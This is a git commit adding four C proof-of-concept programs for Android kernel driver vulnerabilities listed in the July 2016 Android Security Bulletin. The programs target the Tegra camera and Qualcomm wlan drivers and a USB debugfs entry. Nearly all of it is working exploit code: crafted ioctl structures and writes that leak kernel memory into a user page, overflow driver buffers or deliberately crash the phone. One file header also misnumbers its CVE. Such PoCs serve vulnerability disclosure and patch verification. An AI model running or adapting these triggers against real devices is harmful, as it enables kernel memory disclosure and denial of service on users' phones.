ScottyBauer__Android_Kernel_CVE_POCs
commit 3f1e364cebeddc1977fef2cca051be5e2877eadb
Author:     Scott Bauer <sbauer@plzdonthack.me>
AuthorDate: Mon Jul 4 23:49:35 2016 -0600
Commit:     Scott Bauer <sbauer@plzdonthack.me>
CommitDate: Mon Jul 4 23:49:35 2016 -0600

    PoCs for the Android Security July Bulletin
    
    CVE-2016-3794
    CVE-2016-3797
    CVE-2016-3813
    CVE-2016-3815
    
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>

diff --git a/CVE-2016-3794.c b/CVE-2016-3794.c
new file mode 100644
index 0000000..6e4c093
--- /dev/null
+++ b/CVE-2016-3794.c
@@ -0,0 +1,95 @@
+/***  CVE-2016-3794.c
+ *
+ * https://code.google.com/p/android/issues/detail?id=208811
+ * https://android.googlesource.com/kernel/tegra.git/+/android-tegra-flounder-3.10-n-preview-2/drivers/media/platform/tegra/camera.c#672
+ *
+ *
+ */
+
+
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdbool.h>
+#include <strings.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+typedef uint32_t __u32;
+typedef unsigned char __u8;
+
+const char *dev = "/dev/camera.pcl";
+
+#define CAMERA_MAX_NAME_LENGTH  32
+#define VIRTUAL_DEV_MAX_REGULATORS      8
+#define VIRTUAL_DEV_MAX_GPIOS           8
+#define VIRTUAL_DEV_MAX_POWER_SIZE      32
+#define VIRTUAL_REGNAME_SIZE            (VIRTUAL_DEV_MAX_REGULATORS * \
+					 CAMERA_MAX_NAME_LENGTH) //256
+
+enum {
+        CAMERA_DEVICE_TYPE_I2C,
+        CAMERA_DEVICE_TYPE_MAX_NUM,
+};
+
+enum regcache_type {
+        REGCACHE_NONE,
+        REGCACHE_RBTREE,
+        REGCACHE_COMPRESSED,
+        REGCACHE_FLAT,
+};
+
+struct regmap_cfg {
+        int addr_bits;
+        int val_bits;
+        __u32 cache_type;
+};
+
+
+struct nvc_param {
+	__u32 param;
+	__u32 sizeofvalue;
+	__u32 variant;
+	__u32 variant2;
+	__u32 addr;
+} __packed;
+
+#define PCLLK_IOCTL_LAYOUT_RD   _IOWR('o', 121, struct nvc_param)
+
+
+int main(void)
+{
+	int fd, i;
+	struct nvc_param vdev = { 0 };
+	fd = open(dev, O_RDWR);
+	if (fd < 0) {
+		printf("Failed to open %s with errno as %s\n",
+		       dev, strerror(errno));
+		return EXIT_FAILURE;
+	}
+
+	vdev.sizeofvalue = 4096;
+	vdev.variant = 4096 + 0xFFFF8000;
+	/* Too lazy to download the 32bit compiler, please forgive me for
+	   this monstrosity:
+	 */
+	vdev.addr = (uint32_t) mmap(0x41414141, 4096 * 2, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE|MAP_FIXED, -1, 0);
+
+	if ((void*)vdev.addr == MAP_FAILED) {
+		printf("mmap failed with %s\n", strerror(errno));
+		return EXIT_FAILURE;
+	}
+	ioctl(fd, PCLLK_IOCTL_LAYOUT_RD, &vdev);
+
+	printf("mem dump is \n");
+	for (i = 0; i < 4096 / sizeof(int); i += 4)
+		printf("%x ", *(int *)((void *) vdev.addr + i));
+
+	printf("\n");
+
+	return EXIT_FAILURE;
+}
diff --git a/CVE-2016-3797.c b/CVE-2016-3797.c
new file mode 100644
index 0000000..e0d955d
--- /dev/null
+++ b/CVE-2016-3797.c
@@ -0,0 +1,111 @@
+/***  CVE-2016-3797.c
+ *
+ * https://code.google.com/p/android/issues/detail?id=206140
+ * https://android.googlesource.com/kernel/msm.git/+/android-msm-bullhead-3.10-n-preview-1/drivers/staging/qcacld-2.0/CORE/HDD/src/wlan_hdd_main.c#2836
+ *
+ *
+ *
+ */
+
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdbool.h>
+#include <strings.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <net/if.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+
+
+/*
+struct ifreq {
+	char ifr_name[IFNAMSIZ]
+	union {
+		struct sockaddr ifr_addr;
+		struct sockaddr ifr_dstaddr;
+		struct sockaddr ifr_broadaddr;
+		struct sockaddr ifr_netmask;
+		struct sockaddr ifr_hwaddr;
+		short           ifr_flags;
+		int             ifr_ifindex;
+		int             ifr_metric;
+		int             ifr_mtu;
+		struct ifmap    ifr_map;
+		char            ifr_slave[IFNAMSIZ];
+		char            ifr_newname[IFNAMSIZ];
+		char           *ifr_data;
+	};
+};
+
+*/
+
+
+typedef struct hdd_priv_data_s
+{
+	char *buf;
+	int used_len;
+	int total_len;
+}hdd_priv_data_t;
+
+
+static void fill_data(char *data, int used) {
+	while(used <= 8192)
+		used += snprintf(data + used, 8192 - used,
+				 " %d %d %d %d", 1, 2, 3, 4);
+}
+
+
+int main(void)
+{
+	int fd;
+	struct ifreq freak = { 0 };
+	memcpy(freak.ifr_name, "wlan0", 5);
+	fd = socket(AF_INET, SOCK_STREAM, 0);
+	hdd_priv_data_t priv_data = { 0 };
+	priv_data.total_len = 8192;
+	priv_data.buf = mmap(NULL, 4096 * 3, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
+
+	/*
+	  CCXPLMREQ<space><enable><space><dialog_token><space>
+	  <meas_token><space><num_of_bursts><space><burst_int><space>
+	  <measu duration><space><burst_len><space><desired_tx_pwr> 8
+	  <space><multcast_addr><space><number_of_channels>
+	  <space><channel_numbers>
+	*/
+
+	strcpy(priv_data.buf, "CCXPLMREQ 1 2 3 4 5 6 7 8 FF FF FF FF FF FF 255 ");
+
+	/*
+	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
+	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
+	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
+	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
+	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
+	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
+	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
+	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
+	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
+	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
+	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ");
+	*/
+	fill_data(priv_data.buf, 48);
+
+	
+	if (fd < 0) {
+		printf("Failed with %s\n", strerror(errno));
+	}
+	printf("Got socket # %d\n", fd);
+	freak.ifr_data = (void*)&priv_data;
+	ioctl(fd, SIOCDEVPRIVATE + 1, &freak);
+	printf("ret is %s\n", strerror(errno));
+	close(fd);
+
+}
+
diff --git a/CVE-2016-3813.c b/CVE-2016-3813.c
new file mode 100644
index 0000000..0acce9a
--- /dev/null
+++ b/CVE-2016-3813.c
@@ -0,0 +1,44 @@
+/*** CVE-2016-3818.c
+ *
+ * https://code.google.com/p/android/issues/detail?id=206298
+ * https://android.googlesource.com/kernel/msm.git/+/android-msm-bullhead-3.10-n-preview-1/drivers/usb/dwc3/debugfs.c#647
+ *
+ */
+
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdbool.h>
+#include <strings.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <inttypes.h>
+
+static const char *dev = "/sys/kernel/debug/f9200000.dwc3";
+static const char *str = "0 9999999";
+
+int main(void)
+{
+	int fd;
+	char save[15] = { 0 };
+	fd = open(dev, O_RDWR);
+	if (fd < 0) {
+		printf("Failed to open %s with %s\n", dev, strerror(errno));
+		return EXIT_FAILURE;
+	}
+
+	if (write(fd, str, sizeof(str)) != sizeof(str)) {
+		printf("failed to write entire payload\n");
+		close(fd);
+		return EXIT_FAILURE;
+	}
+
+	read(fd, save, sizeof(save));
+
+	/* phone should crash */
+	return EXIT_FAILURE;
+}
diff --git a/CVE-2016-3815.c b/CVE-2016-3815.c
new file mode 100644
index 0000000..2fd0156
--- /dev/null
+++ b/CVE-2016-3815.c
@@ -0,0 +1,108 @@
+/*** CVE-2016-3815.c
+ *
+ * https://code.google.com/p/android/issues/detail?id=208804
+ * https://android.googlesource.com/kernel/tegra.git/+/android-tegra-flounder-3.10-n-preview-2/drivers/media/platform/tegra/cam_dev/virtual.c#433
+ *
+ *
+ */
+
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdbool.h>
+#include <strings.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+typedef uint32_t __u32;
+typedef unsigned char __u8;
+
+const char *dev = "/dev/camera.pcl";
+
+#define CAMERA_MAX_NAME_LENGTH  32
+#define VIRTUAL_DEV_MAX_REGULATORS      8
+#define VIRTUAL_DEV_MAX_GPIOS           8
+#define VIRTUAL_DEV_MAX_POWER_SIZE      32
+#define VIRTUAL_REGNAME_SIZE            (VIRTUAL_DEV_MAX_REGULATORS * \
+					 CAMERA_MAX_NAME_LENGTH) //256
+
+enum {
+        CAMERA_DEVICE_TYPE_I2C,
+        CAMERA_DEVICE_TYPE_MAX_NUM,
+};
+
+enum regcache_type {
+        REGCACHE_NONE,
+        REGCACHE_RBTREE,
+        REGCACHE_COMPRESSED,
+        REGCACHE_FLAT,
+};
+
+struct regmap_cfg {
+        int addr_bits;
+        int val_bits;
+        __u32 cache_type;
+};
+
+struct virtual_device {
+        //void *power_on;
+        //void *power_off;
+	uint32_t k;
+	uint32_t w;
+        struct regmap_cfg regmap_cfg;
+        __u32 bus_type;
+        __u32 gpio_num;
+        __u32 reg_num;
+        __u32 pwr_on_size;
+        __u32 pwr_off_size;
+        __u32 clk_num;
+        __u8 name[32];
+        __u8 reg_names[VIRTUAL_REGNAME_SIZE];
+};
+
+#define PCLLK_IOCTL_CHIP_REG    _IOW('o', 100, struct virtual_device)
+
+int main(void)
+{
+	int fd;
+	struct virtual_device vdev = { 0 };
+	fd = open(dev, O_RDWR);
+	if (fd < 0) {
+		printf("Failed to open %s with errno as %s\n",
+		       dev, strerror(errno));
+		return EXIT_FAILURE;
+	}
+
+	vdev.k = 1;
+	vdev.w = 1;
+	/*
+	vdev.power_on = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
+	vdev.power_off = vdev.power_on;
+
+	if (vdev.power_on == MAP_FAILED) {
+		close(fd);
+		printf("Failed to mmap some data with %s\n", strerror(errno));
+		return EXIT_FAILURE;
+	}
+	*/
+	memset(vdev.name, 'A', 32);
+	printf("%s\n", vdev.name);
+	memset(vdev.reg_names, 'A', VIRTUAL_REGNAME_SIZE);
+	vdev.reg_num = 0xFFFFFFFF;
+
+	vdev.bus_type = CAMERA_DEVICE_TYPE_I2C;
+	vdev.regmap_cfg.addr_bits = 16;
+	vdev.regmap_cfg.val_bits = 8;
+	vdev.regmap_cfg.cache_type = REGCACHE_NONE;
+	vdev.gpio_num = 1;
+	vdev.pwr_on_size = 1;
+	vdev.pwr_off_size = 1; /* prevent null terminiation */
+
+	ioctl(fd, PCLLK_IOCTL_CHIP_REG, &vdev);
+
+	return EXIT_FAILURE;
+}
